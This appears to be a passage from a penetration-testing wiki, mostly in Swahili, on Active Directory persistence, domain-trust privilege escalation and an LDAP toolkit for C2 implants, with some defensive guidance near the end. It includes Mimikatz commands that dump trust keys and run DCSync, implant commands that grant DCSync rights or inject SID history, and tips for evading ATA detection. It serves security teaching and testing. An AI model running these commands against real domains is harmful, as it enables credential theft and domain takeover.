Shambulio la **Silver Ticket** linaunda **Ticket Granting Service (TGS) ticket halali** kwa huduma maalum kwa kutumia **NTLM hash** (kwa mfano, **hash ya account ya PC**). Njia hii inatumiwa kupata **privileges za huduma**.

{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

Shambulio la **Golden Ticket** linahusisha mshambuliaji kupata **NTLM hash ya account ya krbtgt** katika mazingira ya Active Directory. Akaunti hii ni maalum kwa sababu inatumiwa kusaini zote **Ticket Granting Tickets (TGTs)**, ambazo ni muhimu kwa uthibitisho ndani ya mtandao wa AD.

Mara mshambuliaji anapopata hash hii, wanaweza kutengeneza **TGTs** kwa akaunti yoyote waliyopendelea (shambulio la Silver ticket).

{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Hizi ni kama golden tickets zilizofunguliwa kwa njia ambayo **zinapita kwenye mifumo ya kawaida ya kugundua golden tickets.**

{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

**Kuwa na certificates za akaunti au uwezo wa kuziomba** ni njia nzuri ya kudumu kwenye akaunti ya mtumiaji (hata kama anaibadilisha password):

{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**Kutumia certificates pia inawezekana kudumu kwa ruhusa za juu ndani ya domain:**

{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

Kituo cha **AdminSDHolder** katika Active Directory kinahakikisha usalama wa **vikundi vyenye ruhusa** (kama Domain Admins na Enterprise Admins) kwa kutumia ACL ya kawaida kwa vikundi hivi ili kuzuia mabadiliko yasiyoruhusiwa. Hata hivyo, kipengele hiki kinaweza kutumika vibaya; ikiwa mshambuliaji atabadilisha ACL ya AdminSDHolder ili kumpa mtumiaji wa kawaida ufikiaji kamili, mtumiaji huyo atapata udhibiti mpana juu ya vikundi vyote vyenye ruhusa. Kipengele hiki cha usalama, kilichokusudiwa kuwalinda, kinaweza hivyo kuleta matatizo ikiwa hakitazamwi kwa karibu.

[**More information about AdminDSHolder Group here.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

Ndani ya kila **Domain Controller (DC)**, kuna akaunti ya **local administrator**. Kwa kupata haki za admin kwenye mashine kama hiyo, hash ya Local Administrator inaweza kuchukuliwa kwa kutumia **mimikatz**. Baadaye mabadiliko ya registry yanahitajika ili **kuwezesha matumizi ya password hii**, kuruhusu ufikiaji wa mbali kwa akaunti ya Local Administrator.

{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

Unaweza **kumwongeza** mtumiaji **ruhusa maalum** juu ya baadhi ya domain objects ambayo yatamruhusu mtumiaji **kupandisha ruhusa siku zijazo**.

{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

**Security descriptors** hutumika **kuhifadhi** **ruhusa** ambazo **object** zina **juu ya** object hiyo. Ikiwa unaweza kufanya **mabadiliko madogo** kwenye **security descriptor** ya object, unaweza kupata ruhusa za kuvutia juu ya object hiyo bila kuwa mwanachama wa kundi lenye ruhusa.

{{#ref}}
security-descriptors.md
{{#endref}}

### Skeleton Key

Badilisha **LSASS** kwenye memory ili kuweka **password ya ulimwengu wote**, ikiruhusu ufikiaji kwa akaunti zote za domain.

{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Learn what is a SSP (Security Support Provider) here.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Unaweza kuunda SSP yako mwenyewe ili **kuchukua** kwa **plain text** **credentials** zinazotumiwa kufikia mashine.

{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

Inasajili **Domain Controller mpya** katika AD na kuitumia **kusukuma attributes** (SIDHistory, SPNs...) kwenye objects maalum **bila** kuacha **logs** zinazohusu **mabadiliko**. Unahitaji ruhusa za DA na kuwa ndani ya **root domain**.\
Kumbuka kwamba ikiwa utatumia data isiyo sahihi, logs mbaya zitajitokeza.

{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

Tulifafanua awali jinsi ya kupandisha ruhusa ikiwa una **ruhusa za kutosha kusoma LAPS passwords**. Hata hivyo, password hizi pia zinaweza kutumika **kudumisha persistence**.\
Angalia:

{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft inaona **Forest** kama mpaka wa usalama. Hii ina maana kuwa **kuvamia domain moja kunaweza kupelekea kuvamiwa kwa Forest nzima**.

### Basic Information

A [**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) ni mekanisimu ya usalama inayomruhusu mtumiaji kutoka **domain** moja kufikia rasilimali katika **domain** nyingine. Kwa kimsingi inaunda muunganisho kati ya mifumo ya uthibitisho ya domain zote mbili, ikiruhusu uhakiki wa uthibitisho kuf流a kwa urahisi. Wakati domains zinaweka trust, zinabadilisha na kuhifadhi **vifunguo** maalum ndani ya **Domain Controllers (DCs)**, ambavyo ni muhimu kwa uaminifu wa trust.

Katika mfano wa kawaida, ikiwa mtumiaji anataka kufikia huduma katika **trusted domain**, lazima kwanza aoombe TGT maalum inayoitwa **inter-realm TGT** kutoka kwa DC ya domain yake. TGT hii imefichwa kwa **funguo ya trust** ambayo domain zote mbili zimekubaliana. Mtumiaji kisha anaonyesha inter-realm TGT hii kwa **DC ya trusted domain** kupata ticket ya huduma (**TGS**). Baada ya DC ya trusted domain kuthibitisha inter-realm TGT kwa kutumia funguo ya trust na ikiwa ni sahihi, inatoa TGS, ikimpa mtumiaji ufikiaji wa huduma.

**Hatua**:

1. Kompyuta ya **mteja** katika **Domain 1** inaanza mchakato kwa kutumia **NTLM hash** kumwomba **Ticket Granting Ticket (TGT)** kutoka kwa **Domain Controller (DC1)** yake.
2. DC1 hutoa TGT mpya ikiwa mteja amethibitishwa kwa mafanikio.
3. Mteja kisha huomba **inter-realm TGT** kutoka DC1, ambayo inahitajika kufikia rasilimali katika **Domain 2**.
4. Inter-realm TGT imefichwa kwa **trust key** inayoshirikiwa kati ya DC1 na DC2 kama sehemu ya two-way domain trust.
5. Mteja huchukua inter-realm TGT hadi kwa **Domain 2's Domain Controller (DC2)**.
6. DC2 inathibitisha inter-realm TGT kwa kutumia funguo yao ya trust na, ikiwa ni halali, inatoa **Ticket Granting Service (TGS)** kwa server katika Domain 2 ambayo mteja anataka kufikia.
7. Hatimaye, mteja anaonyesha TGS hii kwa server, ambayo imefichwa kwa hash ya account ya server, kupata ufikiaji wa huduma katika Domain 2.

### Different trusts

Ni muhimu kutambua kwamba **trust inaweza kuwa ya upande mmoja au wa pande mbili**. Katika chaguo la pande mbili, domains zote mbili zitawaaminiana, lakini katika uhusiano wa **pande moja** moja ya domains itakuwa **trusted** na nyingine itakuwa **trusting** domain. Katika kesi ya mwisho, **utapata tu kufikia rasilimali ndani ya trusting domain kutoka kwa trusted domain.**

Ikiwa Domain A inaamini Domain B, A ni trusting domain na B ni trusted. Zaidi ya hayo, katika **Domain A**, hii itakuwa **Outbound trust**; na katika **Domain B**, hii itakuwa **Inbound trust**.

**Different trusting relationships**

- **Parent-Child Trusts**: Hii ni mipangilio ya kawaida ndani ya forest moja, ambapo domain mtoto mara moja ina two-way transitive trust na domain mzazi wake. Kwa kimsingi, hili linamaanisha kwamba maombi ya uthibitisho yanaweza kupita bila mshono kati ya mzazi na mtoto.
- **Cross-link Trusts**: Zinatajwa kama "shortcut trusts," hizi zinaanzishwa kati ya child domains kuboresha haraka mchakato wa referral. Katika forests tata, referrals za uthibitisho kwa kawaida zinapaswa kusafiri hadi juu kwenye mizizi ya forest kisha kushuka hadi domain lengwa. Kwa kuunda cross-links, safari hupunguzwa, jambo lenye manufaa hasa katika mazingira yaliyogawanywa kijiografia.
- **External Trusts**: Hizi zinawekwa kati ya domains tofauti, zisizohusiana na ni non-transitive kwa asili. Kulingana na [Microsoft's documentation](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>), external trusts ni muhimu kwa kupata rasilimali katika domain nje ya current forest ambayo haikuunganishwa na forest trust. Usalama unaimarishwa kupitia SID filtering kwa external trusts.
- **Tree-root Trusts**: Hizi trusts zinaanzishwa moja kwa moja kati ya forest root domain na tree root mpya inayoongezwa. Ingawa hazikutambuliki sana, tree-root trusts ni muhimu kwa kuongeza miti mpya ya domain kwenye forest, zikiruhusu kuzihifadhi jina la kipekee la domain na kuhakikisha two-way transitivity. Taarifa zaidi inaweza kupatikana katika [Microsoft's guide](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Forest Trusts**: Aina hii ya trust ni two-way transitive trust kati ya forest root domains mbili, pia ikitekeleza SID filtering ili kuongeza hatua za usalama.
- **MIT Trusts**: Hizi trusts zinaanzishwa na Kerberos domains zisizo za Windows, zinazoendana na [RFC4120](https://tools.ietf.org/html/rfc4120). MIT trusts ni maalum zaidi na zinakidhi mazingira yanayohitaji muunganiko na mifumo ya Kerberos nje ya mazingira ya Windows.

#### Other differences in **trusting relationships**

- Uhusiano wa trust pia unaweza kuwa **transitive** (A inaamini B, B inaamini C, basi A inaamini C) au **non-transitive**.
- Uhusiano wa trust unaweza kuwekwa kama **bidirectional trust** (pande zote zinaaminiana) au kama **one-way trust** (moja tu inaaminia nyingine).

### Attack Path

1. **Tambua** uhusiano wa trusting
2. Angalia ikiwa kuna **security principal** (user/group/computer) ana **ufikiaji** wa rasilimali za **domain nyingine**, labda kupitia ACE entries au kwa kuwa kwenye groups za domain nyingine. Tafuta **uhusiano kati ya domains** (trust ilianzishwa kwa ajili ya hili labda).
1. kerberoast katika kesi hii inaweza kuwa chaguo lingine.
3. **Kamatwa** kwa **accounts** zinazoweza **kupindua** kupitia domains.

Wavamizi wanaoweza kupata rasilimali katika domain nyingine kupitia mekanisimu tatu kuu:

- **Local Group Membership**: Principals wanaweza kuongezwa kwa vikundi vya ndani kwenye mashine, kama kundi la “Administrators” kwenye server, kuwapa udhibiti mkubwa juu ya mashine hiyo.
- **Foreign Domain Group Membership**: Principals pia wanaweza kuwa wanachama wa vikundi ndani ya domain ya kigeni. Hata hivyo, ufanisi wa njia hii unategemea aina ya trust na upeo wa kundi.
- **Access Control Lists (ACLs)**: Principals wanaweza kuelezwa katika **ACL**, hasa kama entities katika **ACEs** ndani ya **DACL**, kuwapa ufikiaji wa rasilimali maalum. Kwa wale wanaotaka kupenya zaidi kwenye mwenendo wa ACLs, DACLs, na ACEs, whitepaper yenye kichwa “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” ni rasilimali muhimu.

### Find external users/groups with permissions

Unaweza kuangalia **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** ili kupata foreign security principals ndani ya domain. Hawa watakuwa user/group kutoka **domain/forest ya nje**.

Unaweza kuangalia hii kwa kutumia **Bloodhound** au kwa kutumia powerview:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Child-to-Parent forest privilege escalation
```bash
# Fro powerview
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
Njia nyingine za kuorodhesha uaminifu wa domain:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> Kuna **2 trusted keys**, moja kwa _Child --> Parent_ na nyingine kwa _Parent_ --> _Child_.\
> Unaweza kupata ile inayotumika na domain ya sasa kwa kutumia:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Escalate as Enterprise admin to the child/parent domain abusing the trust with SID-History injection:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

Ni muhimu kuelewa jinsi Configuration Naming Context (NC) inaweza kutumika kwa madhumuni mabaya. Configuration NC inahudumu kama hifadhi kuu ya data za usanidi ndani ya msitu katika mazingira ya Active Directory (AD). Data hii inaripotiwa kwa kila Domain Controller (DC) ndani ya msitu, na DC zinazoweza kuandikwa zinahifadhi nakala inayoweza kuandikwa ya Configuration NC. Ili ku-exploit hili, lazima uwe na **SYSTEM privileges on a DC**, ikiwezekana DC ya child.

**Link GPO to root DC site**

Kiboreshaji cha Sites cha Configuration NC kina taarifa kuhusu site za kompyuta zote zilizojiunga na domain ndani ya msitu wa AD. Kwa kufanya operesheni ukiwa na **SYSTEM privileges** kwenye DC yoyote, mashambulizi yanaweza kuunganisha GPOs kwenye site za root DC. Hatua hii inaweza kuhatarisha root domain kwa kubadilisha sera zinazotumika kwenye site hizi.

Kwa taarifa za kina, unaweza kuchunguza utafiti wa [Bypassing SID Filtering](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research).

**Compromise any gMSA in the forest**

Njia moja ya shambulio ni kulenga gMSA zenye uwezo za juu ndani ya domain. KDS Root key, muhimu kwa kuhesabu nywila za gMSAs, inahifadhiwa ndani ya Configuration NC. Ukiwa na **SYSTEM privileges** kwenye DC yoyote, inawezekana kufikia KDS Root key na kuhesabu nywila za gMSA yoyote ndani ya msitu.

Uchambuzi wa kina na mwongozo hatua kwa hatua unapatikana katika:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Shambulio linaloambatana la delegated MSA (BadSuccessor – abusing migration attributes):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Utafiti wa ziada wa nje: [Golden gMSA Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent).

**Schema change attack**

Njia hii inahitaji uvumilivu, ikisubiri uumbaji wa vitu vipya vya AD vyenye vibali. Ukiwa na **SYSTEM privileges**, mshambuliaji anaweza kuhariri AD Schema ili kumpa mtumiaji yeyote udhibiti kamili wa classes zote. Hii inaweza kusababisha upatikanaji usiothibitishwa na udhibiti wa vitu vipya vya AD.

Soma zaidi katika [Schema Change Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent).

**From DA to EA with ADCS ESC5**

Udhaifu wa ADCS ESC5 unalenga udhibiti wa vitu vya Public Key Infrastructure (PKI) ili kuunda template ya cheti inayowawezesha kuthibitisha kama mtumiaji yeyote ndani ya msitu. Kwa kuwa vitu vya PKI viko ndani ya Configuration NC, kuvuruga DC ya child inayoweza kuandikwa kunawezesha utekelezaji wa mashambulizi ya ESC5.

Taarifa zaidi zinaweza kusomwa katika [From DA to EA with ESC5](https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c). Katika mazingira yasiyo na ADCS, mshambuliaji ana uwezo wa kuanzisha vipengele vinavyohitajika, kama ilivyoelezwa katika [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).

### External Forest Domain - One-Way (Inbound) or bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
Katika senario hii **your domain is trusted** na domain ya nje inakupa **undetermined permissions** juu yake. Utahitaji kugundua **which principals of your domain have which access over the external domain** kisha ujaribu ku-exploit it:


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### External Forest Domain - One-Way (Outbound)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
Katika senario hii **domain yako** inampa **privileges** mwakilishi kutoka kwa **domain tofauti**.

Hata hivyo, wakati **domain inatumiwa kwa uaminifu** na domain inayomuaminika, domain inayomuaminika **inaunda user** mwenye **jina linaloweza kutabiriwa** ambaye hutumia kama **password password ya trusted**. Hii ina maana kwamba inawezekana **kupitia user kutoka kwa domain inayotumia uaminifu kuingia katika domain inayomuaminika** ili kuifanya enumeration na kujaribu kuongeza privileges zaidi:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Njia nyingine ya kuathiri trusted domain ni kutafuta [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) iliyoundwa katika **mwelekeo ulio kinyume** wa domain trust (ambayo si ya kawaida sana).

Njia nyingine ya kuathiri trusted domain ni kusubiri kwenye mashine ambapo **user kutoka kwa trusted domain anaweza kupata access** kuingia kupitia **RDP**. Kisha, mshambuliaji anaweza kuingiza code ndani ya mchakato wa RDP session na **kupata access kwa origin domain ya mwathiriwa** kutoka hapo.\
Zaidi ya hayo, kama **mwathiriwa ame-mount hard drive yake**, kutoka kwenye mchakato wa **RDP session** mshambuliaji anaweza kuweka **backdoors** katika **startup folder ya hard drive**. Mbinu hii inaitwa **RDPInception.**


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Kupunguza matumizi mabaya ya domain trust

### **SID Filtering:**

- Hatari ya mashambulizi yanayotumia SID history attribute kati ya forest trusts inapunguzwa na SID Filtering, ambayo imewashwa kwa default kwenye inter-forest trusts zote. Hii inategemea dhana kwamba intra-forest trusts ni salama, ikichukulia forest badala ya domain kama mpaka wa usalama kulingana na msimamo wa Microsoft.
- Hata hivyo, kuna tatizo: SID filtering inaweza kuvuruga applications na access za watumiaji, na kusababisha mara kwa mara kuzimwa kwake.

### **Selective Authentication:**

- Kwa inter-forest trusts, kutumia Selective Authentication hufanya watumiaji kutoka forests mbili wasiwe automatically authenticated. Badala yake, inahitaji ruhusa maalum ili watumiaji waweze kupata access kwenye domains na servers ndani ya trusting domain au forest.
- Ni muhimu kutambua kwamba hatua hizi hazilitunaki dhidi ya unyonyaji wa writable Configuration Naming Context (NC) au mashambulizi dhidi ya trust account.

[**More information about domain trusts in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

## LDAP-based AD Abuse from On-Host Implants

The [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) re-implements bloodyAD-style LDAP primitives as x64 Beacon Object Files that run entirely inside an on-host implant (e.g., Adaptix C2). Operators compile the pack with `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, load `ldap.axs`, and then call `ldap <subcommand>` from the beacon. All traffic rides the current logon security context over LDAP (389) with signing/sealing or LDAPS (636) with auto certificate trust, so no socks proxies or disk artifacts are required.

### Implant-side LDAP enumeration

- `get-users`, `get-computers`, `get-groups`, `get-usergroups`, and `get-groupmembers` resolve short names/OU paths into full DNs and dump the corresponding objects.
- `get-object`, `get-attribute`, and `get-domaininfo` pull arbitrary attributes (including security descriptors) plus the forest/domain metadata from `rootDSE`.
- `get-uac`, `get-spn`, `get-delegation`, and `get-rbcd` expose roasting candidates, delegation settings, and existing [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) descriptors directly from LDAP.
- `get-acl` and `get-writable --detailed` parse the DACL to list trustees, rights (GenericAll/WriteDACL/WriteOwner/attribute writes), and inheritance, giving immediate targets for ACL privilege escalation.
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### LDAP write primitives for escalation & persistence

- Object creation BOFs (`add-user`, `add-computer`, `add-group`, `add-ou`) zinamruhusu mtumiaji kuweka principals au machine accounts mpya popote haki za OU zipo. `add-groupmember`, `set-password`, `add-attribute`, na `set-attribute` huchukua lengo moja kwa moja mara haki za write-property zinapopatikana.
- Amri zinazolenga ACL kama `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite`, na `add-dcsync` zinatafsiri WriteDACL/WriteOwner kwenye kitu chochote cha AD kuwa reset za password, udhibiti wa uanachama wa group, au ruhusa za DCSync replication bila kuacha artifacts za PowerShell/ADSI. Mawenzeo `remove-*` hurekebisha ACE zilizochomwa.

### Delegation, roasting, and Kerberos abuse

- `add-spn`/`set-spn` hufanya mara moja user iliyovamiwa kuwa Kerberoastable; `add-asreproastable` (UAC toggle) inaiweka kwa AS-REP roasting bila kugusa password.
- Macros za Delegation (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) hubadilisha `msDS-AllowedToDelegateTo`, flags za UAC, au `msDS-AllowedToActOnBehalfOfOtherIdentity` kutoka kwa beacon, kuruhusu njia za shambulio za constrained/unconstrained/RBCD na kuondoa haja ya PowerShell ya mbali au RSAT.

### sidHistory injection, OU relocation, and attack surface shaping

- `add-sidhistory` huingiza SIDs zilizo na haki za juu kwenye SID history ya principal unaodhibitiwa (ona [SID-History Injection](sid-history-injection.md)), ikitoa urithi wa upatikanaji kwa njia ya kimya kabisa kupitia LDAP/LDAPS.
- `move-object` hubadilisha DN/OU ya computers au users, kumruhusu mshambuliaji kuvuta assets ndani ya OUs ambazo haki za delegated tayari zipo kabla ya kutumia `set-password`, `add-groupmember`, au `add-spn`.
- Amri za kuondoa zilizo na upeo mdogo (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember`, nk.) zinaruhusu rollback ya haraka baada ya operator kukusanya credentials au persistence, kupunguza telemetry.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Some General Defenses

[**Learn more about how to protect credentials here.**](../stealing-credentials/credentials-protections.md)

### **Defensive Measures for Credential Protection**

- **Domain Admins Restrictions**: Inashauriwa kwamba Domain Admins waachwe waweze tu kuingia kwenye Domain Controllers, kuepuka kutumia accounts zao kwenye hosts nyingine.
- **Service Account Privileges**: Services hazifai kuendeshwa kwa ruhusa za Domain Admin (DA) ili kudumisha usalama.
- **Temporal Privilege Limitation**: Kwa kazi zinazohitaji ruhusa za DA, muda wa ruhusa hizo uwekwe kando. Hii inaweza kufikiwa kwa: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`

### **Implementing Deception Techniques**

- Kutumia deception kunajumuisha kuweka vimbunga, kama users au computers wa decoy, kwa sifa kama passwords zisizoisha au zilizoalishwa kuwa Trusted for Delegation. Mbinu kamili inajumuisha kuunda users wenye haki maalum au kuwaongeza kwenye vikundi vyenye ruhusa kubwa.
- Mfano wa vitendo unajumuisha kutumia zana kama: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Zaidi juu ya kuendesha deception techniques ziko kwenye [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception).

### **Identifying Deception**

- **For User Objects**: Vidokezo vinavyoshukiwa ni pamoja na ObjectSID isiyo ya kawaida, logons zisizo za mara kwa mara, tarehe za kuundwa, na idadi ndogo ya bad password attempts.
- **General Indicators**: Kulinganisha attributes za vitu vinavyoweza kuwa decoy na zile za vitu halisi kunaweza kuonyesha kutofanana. Zana kama [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) zinaweza kusaidia katika kutambua deception hizo.

### **Bypassing Detection Systems**

- **Microsoft ATA Detection Bypass**:
- **User Enumeration**: Kuepuka session enumeration kwenye Domain Controllers ili kuzuia utambuzi wa ATA.
- **Ticket Impersonation**: Kutumia keys za **aes** kwa uundaji wa ticket kunasaidia kuepuka utambuzi kwa kutoangusha hadi NTLM.
- **DCSync Attacks**: Kutekeleza kutoka non-Domain Controller ili kuepuka utambuzi wa ATA inashauriwa, kwani utekelezaji moja kwa moja kutoka Domain Controller utasababisha alarms.

## References

- [http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
- [https://www.labofapenetrationtester.com/2018/10/deploy-deception.html](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [LDAP BOF Collection – In-Memory LDAP Toolkit for Active Directory Exploitation](https://github.com/P0142/LDAP-Bof-Collection)
- [TrustedSec – Holy Shuck! Weaponizing NTLM Hashes as a Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [Hashcat](https://github.com/hashcat/hashcat)

{{#include ../../banners/hacktricks-training.md}}
